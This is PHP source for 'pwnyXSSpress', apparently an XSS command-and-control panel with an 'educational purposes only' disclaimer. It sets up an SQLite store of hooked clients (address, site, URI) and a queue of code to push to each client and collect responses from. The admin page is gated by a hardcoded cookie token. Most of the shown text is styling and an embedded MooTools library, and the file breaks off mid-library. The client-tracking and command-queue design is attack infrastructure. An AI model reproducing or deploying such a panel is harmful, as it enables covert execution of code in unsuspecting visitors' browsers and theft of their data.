<?php
/**
 *
 * this is by no means pretty, the goal is to limit what is being uploaded
 *
 * THIS TOOL IS PROVIDED FOR EDUCATIONAL PURPOSES ONLY
 * I AM NOT FOR YOUR (MIS)USE/ABUSE
 *
 * @author defektive
 * @copyright 2010
 *
 *
 * requirements
 * 	PHP5
 * 	PDO
 * 	SQLite
 */
session_start();
error_reporting(E_ALL);
ini_set('display_errors', 'on');
define('TOKEN', 'blah');
date_default_timezone_set('America/Boise');


if(is_dir(dirname(__FILE__).'/data/') === false){
	mkdir(dirname(__FILE__).'/data/');
}

$sql_init = array(
	'CREATE  TABLE "clients" ("remote_addr" VARCHAR, "site" VARCHAR, "uri" VARCHAR, "last_seen" DATETIME)',
	'CREATE  TABLE "cmd_queue" ("client_id" INTEGER, "code" TEXT, "sent" BOOL, "received" BOOL, "errored" BOOL, "response" TEXT)',
	'CREATE  INDEX "client_lookup" ON "clients" ("remote_addr" ASC)',
	'CREATE  INDEX "queue_pop" ON "cmd_queue" ("client_id" ASC, "sent" ASC)',
);

try {
	$dbh = new PDO('sqlite:data/data.sqlite');
} catch (PDOException $e){
	print $e->getMessage();
}

$check_table = "SELECT name FROM sqlite_master WHERE type='table' AND name='clients'";
$stmt = $dbh->prepare($check_table);
$stmt->execute();

if(count($stmt->fetchAll()) === 0){
	foreach ($sql_init as $sql){
		$dbh->exec($sql);
	}
}


if(isset($_COOKIE['TOKEN']) && $_COOKIE['TOKEN']==TOKEN){
	if(isset($_REQUEST['mode']) === false){
		$_REQUEST['mode'] = '';
	}

	switch($_REQUEST['mode']){
		default:
			print '<?xml version="1.0" encoding="UTF-8"?>';
			?>
<!DOCTYPE html
     PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
  <head>
    <title>pwnyXSSpress</title>
    <style>
.icons{
	margin: 1px;
	color: transparent;
	overflow: hidden;
	outline: none;
	cursor: pointer;
	background-image:url('data:image/png;base64,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');
	display: inline-block;
}

.icons.console{
	background-position:-5px -10px;
	width:16px;
	height:16px;
}

.icons.arrow_refresh{
	background-position:-5px -31px;
	width:16px;
	height:16px;
}

.icons.cross{
	background-position:-5px -52px;
	width:16px;
	height:16px;
}

.icons.exclamation{
	background-position:-5px -73px;
	width:16px;
	height:16px;
}

.icons.eye{
	background-position:-5px -94px;
	width:16px;
	height:16px;
}

.icons.information{
	background-position:-5px -115px;
	width:16px;
	height:16px;
}

.icons.monitor{
	background-position:-5px -136px;
	width:16px;
	height:16px;
}

.icons.tick{
	background-position:-5px -157px;
	width:16px;
	height:16px;
}

#page-header, #page-footer {
	background:-webkit-gradient(linear,
	    left bottom,
	    left top,
	    color-stop(0.47, rgb(26,26,26)),
	    color-stop(1, rgb(143,143,143))
	);



	position: fixed;
	box-shadow:0px 0px 8px #111;
	background-color: #303030;
}

#page-header {
	left: 0px;
	top: 0px;
	right: 0px;
	height: 30px;
	background:-moz-linear-gradient(0% 0% 270deg,#303030, #8F8F8F);
	border-bottom: 2px solid #000 ;
}

#page-footer {
	left: 0px;
	bottom: 0px;
	right: 0px;
	height: 30px;
	border-top: 2px solid #000 ;
	background:-moz-linear-gradient(0% 100% 90deg,#303030, #8F8F8F);
}

#page-content {
	margin: 50px 10px;
}

.pretty-table {
	background: #fff;
	box-shadow:0px 0px 8px #111;
	-moz-box-shadow: 0px 0px 10px #111;
	-webkit-border-radius: 6px;
	-moz-border-radius: 6px;
	border-radius: 6px;
	color: #666;
	border-spacing: 0;
}

.pretty-table > thead > tr > th{
	background: #999;
}

.pretty-table > tr + tr > td{
	border-top: 1px dotted #666;
}

.pretty-table > tr > td + td{
	border-left: 1px dotted #666;
}

.pretty-table > tr:nth-child(odd) {
	background: #eee;
}

body{
	background: #333;
	color: #eee;
}

body, input, select, textarea, pre {
	font-family: verdana;
}




/**
 * SqueezeBox - Expandable Lightbox
 *
 * Allows to open various content as modal,
 * centered and animated box.
 *
 * @version		1.1 rc4
 *
 * @license		MIT-style license
 * @author		Harald Kirschner <mail [at] digitarald.de>
 * @copyright	Author
 */

#sbox-overlay {
	position: absolute;
	background-color: #000;
	left: 0px;
	top: 0px;
	zoom: 1;
}

#sbox-window {
	position: absolute;
	background-color: #fff;
	text-align: left;
	overflow: visible;
	padding: 10px;
	/* invalid values, but looks smoother! */
	-moz-border-radius: 3px;
	-webkit-border-radius: 3px;
}

#sbox-btn-close {
	position: absolute;
	width: 30px;
	height: 30px;
	right: -15px;
	top: -15px;
	background: url('data:image/png;base64,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%3D') no-repeat center;
	border: none;
}


.sbox-loading #sbox-content {
	background-image: url('data:image/gif;base64,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');
	background-repeat: no-repeat;
	background-position: center;
}

#sbox-content {
	clear: both;
	overflow: auto;
	background-color: #fff;
	height: 100%;
	width: 100%;
}

.sbox-content-image#sbox-content {
	overflow: visible;
}

#sbox-image {
	display: block;
}

.sbox-content-image img {
	display: block;
	width: 100%;
	height: 100%;
}

.sbox-content-iframe#sbox-content {
	overflow: visible;
}

/* Hides scrollbars */
.body-overlayed {
	overflow: hidden;
}
/* Hides flash (Firefox problem) and selects (IE) */
.body-overlayed embed, .body-overlayed object, .body-overlayed select {
	visibility: hidden;
}
#sbox-window embed, #sbox-window object, #sbox-window select {
	visibility: visible;
}


    </style>
    <script type="text/javascript">
//MooTools, <http://mootools.net>, My Object Oriented (JavaScript) Tools. Copyright (c) 2006-2009 Valerio Proietti, <http://mad4milk.net>, MIT Style License.

var MooTools={version:"1.2.4",build:"0d9113241a90b9cd5643b926795852a2026710d4"};var Native=function(k){k=k||{};var a=k.name;var i=k.legacy;var b=k.protect;
var c=k.implement;var h=k.generics;var f=k.initialize;var g=k.afterImplement||function(){};var d=f||i;h=h!==false;d.constructor=Native;d.$family={name:"native"};
if(i&&f){d.prototype=i.prototype;}d.prototype.constructor=d;if(a){var e=a.toLowerCase();d.prototype.$family={name:e};Native.typize(d,e);}var j=function(n,l,o,m){if(!b||m||!n.prototype[l]){n.prototype[l]=o;
}if(h){Native.genericize(n,l,b);}g.call(n,l,o);return n;};d.alias=function(n,l,p){if(typeof n=="string"){var o=this.prototype[n];if((n=o)){return j(this,l,n,p);
}}for(var m in n){this.alias(m,n[m],l);}return this;};d.implement=function(m,l,o){if(typeof m=="string"){return j(this,m,l,o);}for(var n in m){j(this,n,m[n],l);
}return this;};if(c){d.implement(c);}return d;};Native.genericize=function(b,c,a){if((!a||!b[c])&&typeof b.prototype[c]=="function"){b[c]=function(){var d=Array.prototype.slice.call(arguments);
return b.prototype[c].apply(d.shift(),d);};}};Native.implement=function(d,c){for(var b=0,a=d.length;b<a;b++){d[b].implement(c);}};Native.typize=function(a,b){if(!a.type){a.type=function(c){return($type(c)===b);
};}};(function(){var a={Array:Array,Date:Date,Function:Function,Number:Number,RegExp:RegExp,String:String};for(var h in a){new Native({name:h,initialize:a[h],protect:true});
}var d={"boolean":Boolean,"native":Native,object:Object};for(var c in d){Native.typize(d[c],c);}var f={Array:["concat","indexOf","join","lastIndexOf","pop","push","reverse","shift","slice","sort","splice","toString","unshift","valueOf"],String:["charAt","charCodeAt","concat","indexOf","lastIndexOf","match","replace","search","slice","split","substr","substring","toLowerCase","toUpperCase","valueOf"]};
for(var e in f){for(var b=f[e].length;b--;){Native.genericize(a[e],f[e][b],true);}}})();var Hash=new Native({name:"Hash",initialize:function(a){if($type(a)=="hash"){a=$unlink(a.getClean());
}for(var b in a){this[b]=a[b];}return this;}});Hash.implement({forEach:function(b,c){for(var a in this){if(this.hasOwnProperty(a)){b.call(c,this[a],a,this);
}}},getClean:function(){var b={};for(var a in this){if(this.hasOwnProperty(a)){b[a]=this[a];}}return b;},getLength:function(){var b=0;for(var a in this){if(this.hasOwnProperty(a)){b++;
}}return b;}});Hash.alias("forEach","each");Array.implement({forEach:function(c,d){for(var b=0,a=this.length;b<a;b++){c.call(d,this[b],b,this);}}});Array.alias("forEach","each");
function $A(b){if(b.item){var a=b.length,c=new Array(a);while(a--){c[a]=b[a];}return c;}return Array.prototype.slice.call(b);}function $arguments(a){return function(){return arguments[a];
};}function $chk(a){return !!(a||a===0);}function $clear(a){clearTimeout(a);clearInterval(a);return null;}function $defined(a){return(a!=undefined);}function $each(c,b,d){var a=$type(c);
((a=="arguments"||a=="collection"||a=="array")?Array:Hash).each(c,b,d);}function $empty(){}function $extend(c,a){for(var b in (a||{})){c[b]=a[b];}return c;
}function $H(a){return new Hash(a);}function $lambda(a){return($type(a)=="function")?a:function(){return a;};}function $merge(){var a=Array.slice(arguments);
a.unshift({});return $mixin.apply(null,a);}function $mixin(e){for(var d=1,a=arguments.length;d<a;d++){var b=arguments[d];if($type(b)!="object"){continue;
}for(var c in b){var g=b[c],f=e[c];e[c]=(f&&$type(g)=="object"&&$type(f)=="object")?$mixin(f,g):$unlink(g);}}return e;}function $pick(){for(var b=0,a=arguments.length;
b<a;b++){if(arguments[b]!=undefined){return arguments[b];}}return null;}function $random(b,a){return Math.floor(Math.random()*(a-b+1)+b);}function $splat(b){var a=$type(b);
return(a)?((a!="array"&&a!="arguments")?[b]:b):[];}var $time=Date.now||function(){return +new Date;};function $try(){for(var b=0,a=arguments.length;b<a;
b++){try{return arguments[b]();}catch(c){}}return null;}function $type(a){if(a==undefined){return false;}if(a.$family){return(a.$family.name=="number"&&!isFinite(a))?false:a.$family.name;
}if(a.nodeName){switch(a.nodeType){case 1:return"element";case 3:return(/\S/).test(a.nodeValue)?"textnode":"whitespace";}}else{if(typeof a.length=="number"){if(a.callee){return"arguments";
}else{if(a.item){return"collection";}}}}return typeof a;}function $unlink(c){var b;switch($type(c)){case"object":b={};for(var e in c){b[e]=$unlink(c[e]);
